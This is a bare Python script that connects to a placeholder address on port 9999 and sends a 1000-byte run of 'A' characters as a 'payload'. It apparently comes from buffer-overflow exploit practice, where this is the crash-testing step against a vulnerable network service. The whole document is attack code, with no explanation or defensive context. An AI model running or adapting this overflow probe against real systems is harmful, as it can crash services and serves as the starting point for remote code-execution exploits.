#!/usr/bin/python

import socket
import sys

# Payload
payload = "A" * 1000

try:
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect(('IP',9999))
	s.recv(1024)
	s.send(payload)
	print('Sent payload')
	s.close()
except:
	print('Error')
	sys.exit()
